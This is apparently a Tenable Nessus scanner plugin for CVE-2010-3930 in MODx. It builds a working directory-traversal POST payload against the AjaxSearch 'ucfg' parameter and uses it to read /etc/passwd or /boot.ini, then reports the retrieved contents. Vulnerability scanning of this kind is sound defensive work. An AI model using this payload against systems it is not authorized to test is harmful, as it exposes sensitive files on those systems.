#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(51974);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2015/09/24 21:17:12 $");

  script_cve_id("CVE-2010-3930");
  script_bugtraq_id(46163);
  script_osvdb_id(70772);

  script_name(english:"MODx 'ucfg' Parameter Arbitrary File Access");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(attribute:"synopsis", value:"It may be possible to download arbitrary files from the remote system.");
  script_set_attribute(
    attribute:"description",value:
"The installed version of MODx allows access to arbitrary files
because it fails to perform sufficient validation on 'ucfg' parameter
in 'assets/snippets/ajaxSearch/ajaxSearchPopup.php'.

By supplying directory traversal strings such as '..%2F' in a
specially crafted AjaxSearch 'POST' request, it is possible for a
remote, unauthenticated attacker to read arbitrary files from the
remote system, subject to the privileges under which the web server
operates.

Although Nessus has not checked for them, the installed version is
also likely to be affected by several other vulnerabilities, including
cross-site scripting and SQL injection.");
  script_set_attribute(attribute:"see_also", value:"http://jvn.jp/en/jp/JVN95385972/index.html");
  script_set_attribute(attribute:"see_also", value:"http://modxcms.com/forums/index.php/topic,60045.0.html" );
  script_set_attribute(attribute:"solution", value:"Upgrade to MODx 1.0.5 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/01/26");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/01/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/02/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:modxcms:modxcms");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl", "modx_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "www/modx");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(appname:'modx', port:port, exit_on_fail:TRUE);
dir = install['dir'];

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "\[boot loader\]";

# To exploit the issue, we need the correct AjaxSearch version.
# So query the readme page (accessible by default),
# and try to extract the version

res = http_send_recv3(method:"GET", item:dir + "/assets/snippets/ajaxSearch/ajaxSearch_readme.txt", port:port, exit_on_fail:TRUE);

asv = NULL;
pat = 'AjaxSearch Readme version ([0-9.]+)';
if ("AjaxSearch Readme version " >< res[2])
{
  matches = eregmatch(pattern:pat,string:res[2], icase:TRUE);
  foreach match (split(matches, keep:FALSE))
  {
    item = eregmatch(pattern:pat, string:match, icase:TRUE);
    if (!isnull(item))
    {
      asv = item[1];
      break;
    }
  }
}

if (!isnull(asv))
 as_version = make_list(asv);
else if (isnull(asv) && !thorough_tests)
 as_version = make_list('1.9.0','1.8.5');
else
 as_version = make_list('1.9.0','1.8.5','1.8.4','1.8.3','1.8.2','1.8.1');

trav = mult_str(str:"../", nb:10)+ '..';

part1 = 'q=assets/snippets/ajaxSearch/ajaxSearchPopup.php&search=nessus&as_version=';
part2 = urlencode(str:'&showIntro=`0` &extract=`1` &landingPage=`8` &moreResultsPage=`8` &addJscript=`0` &config=`@FILE');

obsolete_version = FALSE;

foreach av (as_version)
{
  data = part1 + '&as_version='+ av +'&ucfg='+ part2;

  foreach file (files)
  {
    exploit = data + trav + file + "`";

    # Now exploit the issue....
    res = http_send_recv3(
        method:"POST",
        item:dir + "/index-ajax.php",
        port:port,
        content_type:'application/x-www-form-urlencoded',
        data:  exploit,
        exit_on_fail:TRUE);

    if ("AjaxSearch version obsolete" >< res[2])
    {
      obsolete_version = TRUE;
      continue;
    }

    if (egrep(pattern:file_pats[file], string:res[2]))
    {
      if (report_verbosity > 0)
      {
        if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

        req = http_last_sent_request();
        report = '\n' +
        "Nessus was able to verify this issue by sending the following POST request :" + '\n\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        req + '\n' +
        crap(data:"-" , length:30) +  " snip " + crap(data:"-", length:30) + '\n' ;

        if (report_verbosity > 1)
        {
          contents = res[2] - strstr(res[2], '{"res":"<div class') - strstr(res[2], '<div');
          report += '\n' +
           "Here are the contents : " + '\n\n' +
           crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
           contents + '\n' +
           crap(data:"-" , length:30) +  " snip " + crap(data:"-", length:30) + '\n' ;
        }
         security_warning(port:port, extra:report);
      }
      else security_warning(port);
      exit(0);
    }
  }
  # If don't get dinged for obsolete version, and we have checked
  # both files, and there is no vulnerability exit.
  if (!obsolete_version)
   exit(0, "The MODx install at " +  build_url(qs:dir, port:port) + " is not affected.");
}

exit(0, "The MODx install at " +  build_url(qs:dir, port:port) + " is not affected.");
